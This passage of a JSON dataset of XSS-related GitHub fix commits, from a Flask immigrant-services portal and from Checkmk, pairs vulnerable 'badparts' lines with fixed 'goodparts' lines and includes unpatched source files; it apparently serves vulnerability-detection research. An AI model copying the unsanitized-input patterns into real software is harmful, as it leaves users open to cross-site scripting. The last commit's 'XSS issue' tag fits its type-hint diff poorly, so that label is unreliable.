                            "diff": "\n     Returns:\n         Renders profile page for user with in their selected language.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"profile.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/main.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders main legal page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"legal.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/main.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders main health page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"health.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/main.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders the health search page.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"health_search.html\", language=language)\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/main.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        },
                        {
                            "diff": "\n     Returns:\n         Renders information of an organization.\n     \"\"\"\n-    language = request.args.get(\"lang\", \"en\")\n+    language = bleach.clean(request.args.get(\"lang\", \"en\"))\n     return render_template(\"info.html\", language=language)\n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/new_arrivals_chi/app/main.py",
                            "badparts": [
                                "    language = request.args.get(\"lang\", \"en\")"
                            ],
                            "goodparts": [
                                "    language = bleach.clean(request.args.get(\"lang\", \"en\"))"
                            ]
                        }
                    ],
                    "source": "\n\"\"\"Project: new_arrivals_chi. File name: main.py Associated Files: Templates: base.html, home.html, legal.html, health.html, health_search.html, profile.html, login.html, info.html. Runs primary flask application for Chicago's new arrivals' portal. Methods: * home \u2014 Route to homepage of application. * profile -Route to user's profile. * legal -Route to legal portion of application. Last updated: @Author: Summer Long @Sumslong @Date: 05/03/2024 Creation: @Author: Summer Long @Sumslong @Date: 04/19/2024 \"\"\" from flask import Flask, Blueprint, render_template, request import os from dotenv import load_dotenv from new_arrivals_chi.app.database import db, User from flask_migrate import Migrate from flask_login import LoginManager, login_required from new_arrivals_chi.app.authorize_routes import authorize migrate=Migrate() load_dotenv() main=Blueprint(\"main\", __name__, static_folder=\"/static\") @main.route(\"/\") def home(): \"\"\"Establishes route for the home page of New Arrivals Chi. This route is accessible within the 'home' button in the navigation bar and is the page that users are directed to when first visiting the site. Returns: Renders home page. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"home.html\", language=language) @main.route(\"/profile\") @login_required def profile(): \"\"\"Establishes route for the user's profile page. This route is accessible within the 'profile' button in the navigation bar. Returns: Renders profile page for user with in their selected language. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"profile.html\", language=language) @main.route(\"/legal\") def legal(): \"\"\"Establishes route for the legal page. This route is accessible within the 'legal' button on the home page. Returns: Renders main legal page. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"legal.html\", language=language) @main.route(\"/health\") def health(): \"\"\"Establishes route for the health page. This route is accessible within the 'health' button on the home page. Returns: Renders main health page. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"health.html\", language=language) @main.route(\"/health/search\") def health_search(): \"\"\"Establishes route for the health search page. This route is accessible by selecting 'Receive Assistance Now' on the health page. Returns: Renders the health search page. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"health_search.html\", language=language) @main.route(\"/info\") def info(): \"\"\"Establishes route for an unauthenticated view of an org's information. This will be accessible when search is implemented. Returns: Renders information of an organization. \"\"\" language=request.args.get(\"lang\", \"en\") return render_template(\"info.html\", language=language) def create_app(config_override=None): \"\"\"This function creates the flask application for the web portal.\"\"\" app=Flask(__name__) app.config[\"SQLALCHEMY_DATABASE_URI\"]=os.getenv( \"DATABASE_URL\", default=\"sqlite:///:memory:\" ) app.config[\"SECRET_KEY\"]=os.getenv(\"SECRET_KEY\") app.config[\"SQLALCHEMY_TRACK_MODIFICATIONS\"]=False if config_override: app.config.update(config_override) db.init_app(app) migrate.init_app(app, db) app.register_blueprint(main) app.register_blueprint(authorize) login_manager=LoginManager() login_manager.login_view=\"authorize.login\" login_manager.init_app(app) @login_manager.user_loader def load_user(user_id): return User.query.get(int(user_id)) return app if __name__==\"__main__\": app=create_app() app.run(ssl_context=(\"adhoc\"), debug=True) ",
                    "sourceWithComments": "\"\"\"Project: new_arrivals_chi.\n\nFile name: main.py\nAssociated Files:\n    Templates: base.html, home.html, legal.html, health.html,\n    health_search.html, profile.html, login.html, info.html.\n\nRuns primary flask application for Chicago's new arrivals' portal.\n\nMethods:\n    * home \u2014 Route to homepage of application.\n    * profile - Route to user's profile.\n    * legal - Route to legal portion of application.\n\nLast updated:\n@Author: Summer Long @Sumslong\n@Date: 05/03/2024\n\nCreation:\n@Author: Summer Long @Sumslong\n@Date: 04/19/2024\n\"\"\"\n\nfrom flask import Flask, Blueprint, render_template, request\nimport os\nfrom dotenv import load_dotenv\nfrom new_arrivals_chi.app.database import db, User\nfrom flask_migrate import Migrate\nfrom flask_login import LoginManager, login_required\nfrom new_arrivals_chi.app.authorize_routes import authorize\n\n\nmigrate = Migrate()\n\nload_dotenv()\n\nmain = Blueprint(\"main\", __name__, static_folder=\"/static\")\n\n\n@main.route(\"/\")\ndef home():\n    \"\"\"Establishes route for the home page of New Arrivals Chi.\n\n    This route is accessible within the 'home' button in the navigation bar and\n    is the page that users are directed to when first visiting the site.\n\n    Returns:\n        Renders home page.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"home.html\", language=language)\n\n\n@main.route(\"/profile\")\n@login_required\ndef profile():\n    \"\"\"Establishes route for the user's profile page.\n\n    This route is accessible within the 'profile' button in the navigation bar.\n\n    Returns:\n        Renders profile page for user with in their selected language.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"profile.html\", language=language)\n\n\n@main.route(\"/legal\")\ndef legal():\n    \"\"\"Establishes route for the legal page.\n\n    This route is accessible within the 'legal' button on the home page.\n\n    Returns:\n        Renders main legal page.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"legal.html\", language=language)\n\n\n@main.route(\"/health\")\ndef health():\n    \"\"\"Establishes route for the health page.\n\n    This route is accessible within the 'health' button on the home page.\n\n    Returns:\n        Renders main health page.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"health.html\", language=language)\n\n\n@main.route(\"/health/search\")\ndef health_search():\n    \"\"\"Establishes route for the health search page.\n\n    This route is accessible by selecting 'Receive Assistance Now' on the\n    health page.\n\n    Returns:\n        Renders the health search page.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"health_search.html\", language=language)\n\n\n@main.route(\"/info\")\ndef info():\n    \"\"\"Establishes route for an unauthenticated view of an org's information.\n\n    This will be accessible when search is implemented.\n\n    Returns:\n        Renders information of an organization.\n    \"\"\"\n    language = request.args.get(\"lang\", \"en\")\n    return render_template(\"info.html\", language=language)\n\n\ndef create_app(config_override=None):\n    \"\"\"This function creates the flask application for the web portal.\"\"\"\n    app = Flask(__name__)\n    app.config[\"SQLALCHEMY_DATABASE_URI\"] = os.getenv(\n        \"DATABASE_URL\", default=\"sqlite:///:memory:\"\n    )\n    app.config[\"SECRET_KEY\"] = os.getenv(\"SECRET_KEY\")\n    app.config[\"SQLALCHEMY_TRACK_MODIFICATIONS\"] = False\n\n    # Update app configuration with any provided override config (for testing)\n    if config_override:\n        app.config.update(config_override)\n\n    db.init_app(app)\n    migrate.init_app(app, db)\n\n    app.register_blueprint(main)\n    app.register_blueprint(authorize)\n\n    login_manager = LoginManager()\n    login_manager.login_view = \"authorize.login\"\n    login_manager.init_app(app)\n\n    @login_manager.user_loader\n    def load_user(user_id):\n        return User.query.get(int(user_id))\n\n    return app\n\n\nif __name__ == \"__main__\":\n    app = create_app()\n    # Note: For the development server, we are using a auto-generated\n    # self-signed certificate as a result the CA is unable to validate a server\n    # certificate, though you can continue to proceed and visit the development\n    # site. For the production deployment, we will ensure a valid certificate\n    # from CA for our domain.\n    app.run(ssl_context=(\"adhoc\"), debug=True)\n"
                }
            },
            "msg": "Feat mitigating xss attacks (#162)\n\nThis PR will close #146 by sanitizing all user inputs and encoding\r\nuser-controlled data that is outputed in HTTP responses\r\n\r\n## Describe your changes\r\n\r\nSanitization of User Inputs:\r\n- Implemented bleach.clean() to sanitize all user inputs across the\r\napplication. Removes potentially malicious scripts from the inputs\r\nbefore they are processed or stored. All form inputs, including login\r\nand password change forms, now pass through bleach.clean() before\r\nprocessing. Query parameters are sanitized where they are used in the\r\napplication logic.\r\n\r\nEncoding of User-Controlled Data in Templates:\r\n- Utilized the | escape Jinja2 filter in our HTML templates to ensure\r\nthat any user-controlled data is safely encoded before being rendered in\r\nthe browser.\r\n\r\n- Applied escape() function in conjunction with Flask's flash() messages\r\nto encode feedback messages before they are displayed to the user.\r\n\r\n## Non-obvious technical information\r\n- the | escape Jinja2 filter is redundant, the template does this by\r\ndefault so we can remove if we feel like it is unnecessary\r\n\r\n## Checklist before requesting a review\r\n- [X] pre-commit run --all-files (run before pushing)\r\n- [X] pytest if applicable\r\n- [X] Link issue\r\n- [X] Update relevant documentation if applicable: doc strings, readme,\r\npoetry.\r\n\r\n```commandline\r\nHERE IS SOME COMMAND LINE OUTPUT\r\n```"
        }
    },
    "https://github.com/Checkmk/checkmk": {
        "a67bdee362cd4aeb08f696cb3e06262a905bf1cf": {
            "url": "https://api.github.com/repos/Checkmk/checkmk/commits/a67bdee362cd4aeb08f696cb3e06262a905bf1cf",
            "html_url": "https://github.com/Checkmk/checkmk/commit/a67bdee362cd4aeb08f696cb3e06262a905bf1cf",
            "sha": "a67bdee362cd4aeb08f696cb3e06262a905bf1cf",
            "keyword": "XSS change",
            "diff": "diff --git a/cmk/gui/dashboard/dashlet/figure_dashlet.py b/cmk/gui/dashboard/dashlet/figure_dashlet.py\nindex b3178f8925c..9ae51ec1329 100644\n--- a/cmk/gui/dashboard/dashlet/figure_dashlet.py\n+++ b/cmk/gui/dashboard/dashlet/figure_dashlet.py\n@@ -30,7 +30,7 @@\n class FigureDashletPage(AjaxPage):\n     def page(self) -> PageResult:\n         dashboard_name = request.get_ascii_input_mandatory(\"name\")\n-        dashboard_owner = UserId(request.get_ascii_input_mandatory(\"owner\"))\n+        dashboard_owner = request.get_validated_type_input_mandatory(UserId, \"owner\")\n         try:\n             dashboard = get_permitted_dashboards_by_owners()[dashboard_name][dashboard_owner]\n         except KeyError:\ndiff --git a/cmk/gui/dashboard/page_show_dashboard.py b/cmk/gui/dashboard/page_show_dashboard.py\nindex 04e4c26604b..8b69c2a2262 100644\n--- a/cmk/gui/dashboard/page_show_dashboard.py\n+++ b/cmk/gui/dashboard/page_show_dashboard.py\n@@ -92,8 +92,8 @@ def page_dashboard() -> None:\n \n     # If no owner is set, prioritize the user's own dashboard over the builtin ones\n     owner = (\n-        UserId(o)\n-        if (o := request.get_ascii_input(\"owner\")) is not None\n+        o\n+        if (o := request.get_validated_type_input(UserId, \"owner\")) is not None\n         else (\n             user.id if user.id in get_permitted_dashboards_by_owners()[name] else UserId.builtin()\n         )\n@@ -1115,7 +1115,7 @@ def draw_dashlet(dashlet: Dashlet, content: HTML | str, title: HTML | str) -> No\n def ajax_dashlet() -> None:\n     \"\"\"Render the inner HTML of a dashlet\"\"\"\n     name = request.get_ascii_input_mandatory(\"name\", \"\")\n-    owner = UserId(request.get_ascii_input_mandatory(\"owner\", \"\"))\n+    owner = request.get_validated_type_input_mandatory(UserId, \"owner\", UserId.builtin())\n     if not name:\n         raise MKUserError(\"name\", _(\"The name of the dashboard is missing.\"))\n \n",
            "message": "",
            "files": {
                "/cmk/gui/dashboard/dashlet/figure_dashlet.py": {
                    "changes": [
                        {
                            "diff": "\n class FigureDashletPage(AjaxPage):\n     def page(self) -> PageResult:\n         dashboard_name = request.get_ascii_input_mandatory(\"name\")\n-        dashboard_owner = UserId(request.get_ascii_input_mandatory(\"owner\"))\n+        dashboard_owner = request.get_validated_type_input_mandatory(UserId, \"owner\")\n         try:\n             dashboard = get_permitted_dashboards_by_owners()[dashboard_name][dashboard_owner]\n         except KeyError:",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/dashboard/dashlet/figure_dashlet.py",
                            "badparts": [
                                "        dashboard_owner = UserId(request.get_ascii_input_mandatory(\"owner\"))"
                            ],
                            "goodparts": [
                                "        dashboard_owner = request.get_validated_type_input_mandatory(UserId, \"owner\")"
                            ]
                        }
                    ],
                    "source": "\n import abc import json from typing import cast from cmk.utils.user import UserId from cmk.gui.dashboard.type_defs import DashletSize from cmk.gui.exceptions import MKUserError from cmk.gui.figures import create_figures_response, FigureResponseData from cmk.gui.htmllib.html import html from cmk.gui.http import request from cmk.gui.i18n import _ from cmk.gui.pages import AjaxPage, PageResult from cmk.gui.type_defs import HTTPVariables, SingleInfos from cmk.gui.utils.urls import urlencode_vars from cmk.gui.valuespec import Dictionary, DictionaryElements, MigrateNotUpdated from..store import get_permitted_dashboards_by_owners from.base import Dashlet, T from.registry import dashlet_registry __all__=[\"FigureDashletPage\", \"ABCFigureDashlet\"] class FigureDashletPage(AjaxPage): def page(self) -> PageResult: dashboard_name=request.get_ascii_input_mandatory(\"name\") dashboard_owner=UserId(request.get_ascii_input_mandatory(\"owner\")) try: dashboard=get_permitted_dashboards_by_owners()[dashboard_name][dashboard_owner] except KeyError: raise MKUserError(\"name\", _(\"The requested dashboard does not exist.\")) dashboard[\"context\"]=json.loads(request.get_ascii_input_mandatory(\"context\")) dashlet_id=request.get_integer_input_mandatory(\"id\") try: dashlet_spec=dashboard[\"dashlets\"][dashlet_id] except IndexError: raise MKUserError(\"id\", _(\"The element does not exist.\")) try: dashlet_type=cast(type[ABCFigureDashlet], dashlet_registry[dashlet_spec[\"type\"]]) except KeyError: raise MKUserError(\"type\", _(\"The requested element type does not exist.\")) dashlet=dashlet_type(dashboard_name, dashboard_owner, dashboard, dashlet_id, dashlet_spec) return create_figures_response(dashlet.generate_response_data()) class ABCFigureDashlet(Dashlet[T], abc.ABC): \"\"\"Base class for cmk_figures based graphs Only contains the dashlet spec, the data generation is handled in the DataGenerator classes, to split visualization and data \"\"\" @classmethod def type_name(cls) -> str: return \"figure_dashlet\" @classmethod def sort_index(cls) -> int: return 95 @classmethod def initial_refresh_interval(cls) -> bool: return False @classmethod def initial_size(cls) -> DashletSize: return(56, 40) def infos(self) -> SingleInfos: return[\"host\", \"service\"] @classmethod def single_infos(cls) -> SingleInfos: return[] @classmethod def has_context(cls) -> bool: return True @property def instance_name(self) -> str: return f\"{self.type_name()}_{self._dashlet_id}\" @classmethod def vs_parameters(cls) -> MigrateNotUpdated: return MigrateNotUpdated( valuespec=Dictionary( title=_(\"Properties\"), render=\"form\", optional_keys=cls._vs_optional_keys(), elements=cls._vs_elements(), ), migrate=cls._migrate_vs, ) @staticmethod def _vs_optional_keys() -> bool | list[str]: return False @staticmethod def _migrate_vs(valuespec_result): if \"svc_status_display\" in valuespec_result: valuespec_result[\"status_display\"]=valuespec_result.pop(\"svc_status_display\") return valuespec_result @staticmethod def _vs_elements() -> DictionaryElements: return[] @abc.abstractmethod def generate_response_data(self) -> FigureResponseData:... @property def update_interval(self) -> int: return 60 def on_resize(self): return(\"if(typeof %(instance)s !='undefined'){\" \"%(instance)s.update_gui();\" \"}\") %{ \"instance\": self.instance_name } def show(self) -> None: self.js_dashlet(figure_type_name=self.type_name()) def js_dashlet(self, figure_type_name: str) -> None: fetch_url=\"ajax_figure_dashlet_data.py\" div_id=\"%s_dashlet_%d\" %(self.type_name(), self._dashlet_id) html.div(\"\", id_=div_id) post_body=urlencode_vars(self._dashlet_http_variables()) html.javascript( \"\"\" let figure_%(dashlet_id)d=cmk.figures.figure_registry.get_figure(%(type_name)s); let %(instance_name)s=new figure_%(dashlet_id)d(%(div_selector)s); %(instance_name)s.set_post_url_and_body(%(url)s, %(body)s); %(instance_name)s.set_dashlet_spec(%(dashlet_spec)s); %(instance_name)s.initialize(); %(instance_name)s.scheduler.set_update_interval(%(update)d); %(instance_name)s.scheduler.enable(); \"\"\" %{ \"type_name\": json.dumps(figure_type_name), \"dashlet_id\": self._dashlet_id, \"dashlet_spec\": json.dumps(self.dashlet_spec), \"instance_name\": self.instance_name, \"div_selector\": json.dumps(\" \"url\": json.dumps(fetch_url), \"body\": json.dumps(post_body), \"update\": self.update_interval, } ) def _dashlet_http_variables(self) -> HTTPVariables: return[ (\"name\", self.dashboard_name), (\"id\", self.dashlet_id), (\"owner\", self.dashboard_owner), (\"context\", json.dumps(self._dashboard[\"context\"])), ] ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2019 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\nimport abc\nimport json\nfrom typing import cast\n\nfrom cmk.utils.user import UserId\n\nfrom cmk.gui.dashboard.type_defs import DashletSize\nfrom cmk.gui.exceptions import MKUserError\nfrom cmk.gui.figures import create_figures_response, FigureResponseData\nfrom cmk.gui.htmllib.html import html\nfrom cmk.gui.http import request\nfrom cmk.gui.i18n import _\nfrom cmk.gui.pages import AjaxPage, PageResult\nfrom cmk.gui.type_defs import HTTPVariables, SingleInfos\nfrom cmk.gui.utils.urls import urlencode_vars\nfrom cmk.gui.valuespec import Dictionary, DictionaryElements, MigrateNotUpdated\n\nfrom ..store import get_permitted_dashboards_by_owners\nfrom .base import Dashlet, T\nfrom .registry import dashlet_registry\n\n__all__ = [\"FigureDashletPage\", \"ABCFigureDashlet\"]\n\n\nclass FigureDashletPage(AjaxPage):\n    def page(self) -> PageResult:\n        dashboard_name = request.get_ascii_input_mandatory(\"name\")\n        dashboard_owner = UserId(request.get_ascii_input_mandatory(\"owner\"))\n        try:\n            dashboard = get_permitted_dashboards_by_owners()[dashboard_name][dashboard_owner]\n        except KeyError:\n            raise MKUserError(\"name\", _(\"The requested dashboard does not exist.\"))\n        # Get context from the AJAX request body (not simply from the dashboard config) to include\n        # potential dashboard context given via HTTP request variables\n        dashboard[\"context\"] = json.loads(request.get_ascii_input_mandatory(\"context\"))\n\n        dashlet_id = request.get_integer_input_mandatory(\"id\")\n        try:\n            dashlet_spec = dashboard[\"dashlets\"][dashlet_id]\n        except IndexError:\n            raise MKUserError(\"id\", _(\"The element does not exist.\"))\n\n        try:\n            dashlet_type = cast(type[ABCFigureDashlet], dashlet_registry[dashlet_spec[\"type\"]])\n        except KeyError:\n            raise MKUserError(\"type\", _(\"The requested element type does not exist.\"))\n\n        dashlet = dashlet_type(dashboard_name, dashboard_owner, dashboard, dashlet_id, dashlet_spec)\n        return create_figures_response(dashlet.generate_response_data())\n\n\nclass ABCFigureDashlet(Dashlet[T], abc.ABC):\n    \"\"\"Base class for cmk_figures based graphs\n    Only contains the dashlet spec, the data generation is handled in the\n    DataGenerator classes, to split visualization and data\n    \"\"\"\n\n    @classmethod\n    def type_name(cls) -> str:\n        return \"figure_dashlet\"\n\n    @classmethod\n    def sort_index(cls) -> int:\n        return 95\n\n    @classmethod\n    def initial_refresh_interval(cls) -> bool:\n        return False\n\n    @classmethod\n    def initial_size(cls) -> DashletSize:\n        return (56, 40)\n\n    def infos(self) -> SingleInfos:\n        return [\"host\", \"service\"]\n\n    @classmethod\n    def single_infos(cls) -> SingleInfos:\n        return []\n\n    @classmethod\n    def has_context(cls) -> bool:\n        return True\n\n    @property\n    def instance_name(self) -> str:\n        # Note: This introduces the restriction one graph type per dashlet\n        return f\"{self.type_name()}_{self._dashlet_id}\"\n\n    @classmethod\n    def vs_parameters(cls) -> MigrateNotUpdated:\n        return MigrateNotUpdated(\n            valuespec=Dictionary(\n                title=_(\"Properties\"),\n                render=\"form\",\n                optional_keys=cls._vs_optional_keys(),\n                elements=cls._vs_elements(),\n            ),\n            migrate=cls._migrate_vs,\n        )\n\n    @staticmethod\n    def _vs_optional_keys() -> bool | list[str]:\n        return False\n\n    @staticmethod\n    def _migrate_vs(valuespec_result):\n        if \"svc_status_display\" in valuespec_result:\n            # now as code is shared between host and service (svc) dashlet,\n            # the `svc_` prefix is removed.\n            valuespec_result[\"status_display\"] = valuespec_result.pop(\"svc_status_display\")\n        return valuespec_result\n\n    @staticmethod\n    def _vs_elements() -> DictionaryElements:\n        return []\n\n    @abc.abstractmethod\n    def generate_response_data(self) -> FigureResponseData: ...\n\n    @property\n    def update_interval(self) -> int:\n        return 60\n\n    def on_resize(self):\n        return (\"if (typeof %(instance)s != 'undefined') {\" \"%(instance)s.update_gui();\" \"}\") % {\n            \"instance\": self.instance_name\n        }\n\n    def show(self) -> None:\n        self.js_dashlet(figure_type_name=self.type_name())\n\n    def js_dashlet(self, figure_type_name: str) -> None:\n        fetch_url = \"ajax_figure_dashlet_data.py\"\n        div_id = \"%s_dashlet_%d\" % (self.type_name(), self._dashlet_id)\n        html.div(\"\", id_=div_id)\n\n        # TODO: Would be good to align this scheme with AjaxPage.webapi_request()\n        # (a single HTTP variable \"request=<json-body>\".\n        post_body = urlencode_vars(self._dashlet_http_variables())\n\n        html.javascript(\n            \"\"\"\n            let figure_%(dashlet_id)d = cmk.figures.figure_registry.get_figure(%(type_name)s);\n            let %(instance_name)s = new figure_%(dashlet_id)d(%(div_selector)s);\n            %(instance_name)s.set_post_url_and_body(%(url)s, %(body)s);\n            %(instance_name)s.set_dashlet_spec(%(dashlet_spec)s);\n            %(instance_name)s.initialize();\n            %(instance_name)s.scheduler.set_update_interval(%(update)d);\n            %(instance_name)s.scheduler.enable();\n            \"\"\"\n            % {\n                \"type_name\": json.dumps(figure_type_name),\n                \"dashlet_id\": self._dashlet_id,\n                \"dashlet_spec\": json.dumps(self.dashlet_spec),\n                \"instance_name\": self.instance_name,\n                \"div_selector\": json.dumps(\"#%s\" % div_id),\n                \"url\": json.dumps(fetch_url),\n                \"body\": json.dumps(post_body),\n                \"update\": self.update_interval,\n            }\n        )\n\n    def _dashlet_http_variables(self) -> HTTPVariables:\n        return [\n            (\"name\", self.dashboard_name),\n            (\"id\", self.dashlet_id),\n            (\"owner\", self.dashboard_owner),\n            # Add context to the dashlet's AJAX request body so any dashboard context that is given\n            # via HTTP request is not lost in the AJAX call\n            (\"context\", json.dumps(self._dashboard[\"context\"])),\n        ]\n"
                },
                "/cmk/gui/dashboard/page_show_dashboard.py": {
                    "changes": [
                        {
                            "diff": "\n \n     # If no owner is set, prioritize the user's own dashboard over the builtin ones\n     owner = (\n-        UserId(o)\n-        if (o := request.get_ascii_input(\"owner\")) is not None\n+        o\n+        if (o := request.get_validated_type_input(UserId, \"owner\")) is not None\n         else (\n             user.id if user.id in get_permitted_dashboards_by_owners()[name] else UserId.builtin()\n         )\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/cmk/gui/dashboard/page_show_dashboard.py",
                            "badparts": [
                                "        UserId(o)",
                                "        if (o := request.get_ascii_input(\"owner\")) is not None"
                            ],
                            "goodparts": [
                                "        o",
                                "        if (o := request.get_validated_type_input(UserId, \"owner\")) is not None"
                            ]
                        },
                        {
                            "diff": "\n def ajax_dashlet() -> None:\n     \"\"\"Render the inner HTML of a dashlet\"\"\"\n     name = request.get_ascii_input_mandatory(\"name\", \"\")\n-    owner = UserId(request.get_ascii_input_mandatory(\"owner\", \"\"))\n+    owner = request.get_validated_type_input_mandatory(UserId, \"owner\", UserId.builtin())\n     if not name:\n         raise MKUserError(\"name\", _(\"The name of the dashboard is missing.\"))\n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/cmk/gui/dashboard/page_show_dashboard.py",
                            "badparts": [
                                "    owner = UserId(request.get_ascii_input_mandatory(\"owner\", \"\"))"
                            ],
                            "goodparts": [
                                "    owner = request.get_validated_type_input_mandatory(UserId, \"owner\", UserId.builtin())"
                            ]
                        }
                    ]
                }
            },
            "msg": "Fix XSS tests\n\nThe UserId raises a ValueError if non-allowed values are encountered.\nThe request.get_validated_type... functions catch these and make\nMKUserErrors out of it...\n\nChange-Id: I141cb9e463669e253fedb620af7a276d915a323e"
        },
        "2132819580f931e0f01b3531cc9e52462aa5300c": {
            "url": "https://api.github.com/repos/Checkmk/checkmk/commits/2132819580f931e0f01b3531cc9e52462aa5300c",
            "html_url": "https://github.com/Checkmk/checkmk/commit/2132819580f931e0f01b3531cc9e52462aa5300c",
            "sha": "2132819580f931e0f01b3531cc9e52462aa5300c",
            "keyword": "XSS issue",
            "diff": "diff --git a/cmk/gui/wato/pages/_simple_modes.py b/cmk/gui/wato/pages/_simple_modes.py\nindex d18241b7a2e..2673ca87a0a 100644\n--- a/cmk/gui/wato/pages/_simple_modes.py\n+++ b/cmk/gui/wato/pages/_simple_modes.py\n@@ -14,7 +14,7 @@\n import abc\n import copy\n from collections.abc import Mapping\n-from typing import Any, cast, Generic, TypeVar\n+from typing import Any, Generic, TypeVar\n \n from livestatus import SiteId\n \n@@ -322,7 +322,7 @@ def _show_action_cell(self, nr: int, table: Table, ident: str, entry: _T) -> Non\n         )\n \n \n-class SimpleEditMode(_SimpleWatoModeBase[_T], abc.ABC):\n+class SimpleEditMode(_SimpleWatoModeBase, abc.ABC):\n     \"\"\"Base class for edit modes\"\"\"\n \n     @abc.abstractmethod\n@@ -360,6 +360,7 @@ def _from_vars(self) -> None:\n \n         self._new = True\n         self._ident = None\n+        self._entry = {}\n \n     def title(self) -> str:\n         if self._new:\n@@ -487,8 +488,7 @@ def action(self) -> ActionResult:\n         if \"ident\" in config:\n             self._ident = config.pop(\"ident\")\n         assert self._ident is not None\n-        # No typing support from valuespecs here, so we need to cast\n-        self._entry = cast(_T, config)\n+        self._entry = config\n \n         entries = self._store.load_for_modification()\n \n@@ -538,7 +538,7 @@ def page(self) -> None:\n \n             vs = self.valuespec()\n \n-            vs.render_input(\"_edit\", dict(self._entry))\n+            vs.render_input(\"_edit\", self._entry)\n             vs.set_focus(\"_edit\")\n             forms.end()\n \ndiff --git a/cmk/gui/wato/pages/global_settings.py b/cmk/gui/wato/pages/global_settings.py\nindex 80239eb9960..05de3edc510 100644\n--- a/cmk/gui/wato/pages/global_settings.py\n+++ b/cmk/gui/wato/pages/global_settings.py\n@@ -44,7 +44,7 @@\n from cmk.gui.utils.html import HTML\n from cmk.gui.utils.transaction_manager import transactions\n from cmk.gui.utils.urls import makeactionuri, makeuri_contextless\n-from cmk.gui.valuespec import Checkbox, Transform, ValueSpec\n+from cmk.gui.valuespec import Checkbox, Transform\n from cmk.gui.watolib.config_domain_name import (\n     ABCConfigDomain,\n     config_variable_group_registry,\n@@ -571,7 +571,7 @@ def _back_url(self) -> str:\n         return ModeEditGlobals.mode_url()\n \n \n-def is_a_checkbox(vs: ValueSpec) -> bool:\n+def is_a_checkbox(vs) -> bool:  # type: ignore[no-untyped-def]\n     \"\"\"Checks if a valuespec is a Checkbox\"\"\"\n     if isinstance(vs, Checkbox):\n         return True\ndiff --git a/cmk/gui/wato/pages/predefined_conditions.py b/cmk/gui/wato/pages/predefined_conditions.py\nindex b713653cad5..be2b678aada 100644\n--- a/cmk/gui/wato/pages/predefined_conditions.py\n+++ b/cmk/gui/wato/pages/predefined_conditions.py\n@@ -8,7 +8,6 @@\n \n import cmk.gui.userdb as userdb\n from cmk.gui.exceptions import MKUserError\n-from cmk.gui.groups import GroupSpec\n from cmk.gui.htmllib.html import html\n from cmk.gui.http import request\n from cmk.gui.i18n import _\n@@ -89,7 +88,7 @@ def affected_config_domains(self):\n         return [ConfigDomainCore]\n \n \n-class ModePredefinedConditions(SimpleListMode[GroupSpec]):\n+class ModePredefinedConditions(SimpleListMode):\n     @classmethod\n     def name(cls) -> str:\n         return \"predefined_conditions\"\n@@ -134,7 +133,13 @@ def page(self) -> None:\n         )\n         super().page()\n \n-    def _show_action_cell(self, nr: int, table: Table, ident: str, entry: GroupSpec) -> None:\n+    def _show_action_cell(  # type: ignore[no-untyped-def]\n+        self,\n+        nr: int,\n+        table: Table,\n+        ident: str,\n+        entry,\n+    ) -> None:\n         super()._show_action_cell(nr, table, ident, entry)\n \n         html.icon_button(\n@@ -143,7 +148,7 @@ def _show_action_cell(self, nr: int, table: Table, ident: str, entry: GroupSpec)\n             \"search\",\n         )\n \n-    def _search_url(self, ident: str) -> str:\n+    def _search_url(self, ident):\n         return makeuri_contextless(\n             request,\n             [\n@@ -154,7 +159,7 @@ def _search_url(self, ident: str) -> str:\n             ],\n         )\n \n-    def _show_entry_cells(self, table: Table, ident: str, entry: GroupSpec) -> None:\n+    def _show_entry_cells(self, table, ident, entry):\n         table.cell(_(\"Title\"), entry[\"title\"])\n \n         table.cell(_(\"Conditions\"))\n@@ -186,11 +191,11 @@ def 